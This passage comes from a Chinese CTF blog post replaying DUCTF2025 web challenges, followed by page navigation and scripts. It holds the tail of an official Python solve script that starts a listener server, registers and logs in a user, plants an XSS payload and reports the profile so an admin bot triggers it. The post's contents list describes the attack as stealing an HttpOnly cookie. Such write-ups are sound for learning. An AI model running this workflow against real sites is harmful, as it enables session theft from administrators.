class="string">&quot;submit&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = session.post(<span class="string">f&quot;<span class="subst">&#123;URL&#125;</span>/edit_profile.jsp&quot;</span>, data=data)</span><br><span class="line">    <span class="keyword">assert</span> response.status_code == <span class="number">200</span>, <span class="string">&quot;Failed to report profile&quot;</span></span><br><span class="line"></span><br><span class="line">URL, LHOST, USERNAME, LPORT, PASSWORD= [ <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    user = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>))</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--url&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target url with port, for e.g. http://127.0.0.1:8888/&#x27;</span>, default=<span class="string">&quot;http://sweet-treat:8888/&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--username&#x27;</span>, <span class="string">&#x27;-U&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target username&#x27;</span>, default=user)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--lhost&quot;</span>, default=<span class="string">&quot;172.17.0.1&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;Your local host for the HTTP Server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--lport&quot;</span>, default=<span class="string">&quot;8000&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;HTTP Server port to listen on&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--password&quot;</span>, default=<span class="string">&quot;password&quot;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;Set the password&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="comment"># Setting all the globals, just so that they look cleaner</span></span><br><span class="line">    USERNAME, LHOST, LPORT, PASSWORD = [</span><br><span class="line">        args.username, args.lhost, args.lport, args.password]</span><br><span class="line">    URL = args.url <span class="keyword">if</span> args.url[-<span class="number">1</span>] != <span class="string">&quot;/&quot;</span> <span class="keyword">else</span> args.url[:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># Set up logging to save time with errors</span></span><br><span class="line">    httpd = start_web_server()</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    register_user()</span><br><span class="line">    session = login(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] User registered and logged in successfully&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Injecting XSS payload into the admin page&quot;</span>)</span><br><span class="line">    send_xss_payload(session)</span><br><span class="line">    report_profile(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] XSS payload sent, waiting for admin interaction...&quot;</span>)</span><br><span class="line">    xss_event.wait()</span><br><span class="line">    httpd.shutdown()</span><br></pre></td></tr></table></figure>
+<h4 id="做题感想"><a class="markdownIt-Anchor" href="#做题感想"></a> 做题感想</h4>
+<p>直到做了这题才发现国内题和国外题真正的区别，国内题就考脑洞，考你怎么绕过，虽然国外题也有，但好歹人家给你提示…国外题大部分都在考你实战技术，所以也难到炸裂</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/XSS%E8%BF%9B%E9%98%B6/" rel="tag">XSS进阶</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/17373827994914.jpg" data-sizes="auto" alt="JAVAEE" class="lazyload">
+        
+        <a href="/2025/07/22/JAVAEE/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JAVAEE
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="DU2024docker部分复现" class="lazyload">
+        
+      
+      <a href="/2025/07/19/DownUnderctf2024docker%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          DU2024docker部分复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mini-me%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text"> mini-me（文件泄露）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mutant%E7%AA%81%E5%8F%98xss%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text"> Mutant（突变XSS绕过）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sweet_treatcookie-sandwiching%E6%94%BB%E5%87%BB%E7%AA%83%E5%8F%96httponly-cookie"><span class="toc-number">1.3.</span> <span class="toc-text"> Sweet_Treat（Cookie Sandwiching攻击窃取HTTPOnly Cookie）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%9D%A2%E6%88%91%E8%87%AA%E5%B7%B1%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 后面我自己的理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 官方解题脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E6%84%9F%E6%83%B3"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 做题感想</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "DUCTF2025比赛复现",
+          url: "http://example.com/2025/07/20/DUCTF2025%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: " WEB  mini-me（文件泄露） 这题说实话-我是sb（看了好久楞是没看到有个提示） 但这也是我唯一一次在国外比赛中做出来的题，可喜可贺 该题题目给了附件 1234567891011121314151617181920212223242526272829303132333435from flask import Flask, render_template, send_from_directory, request, redirect, make_responsefrom dotenv i",
+          date: "Sun Jul 20 2025 11:32:59 GMT+0800",
+          updated: "Wed Oct 22 2025 10:55:31 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
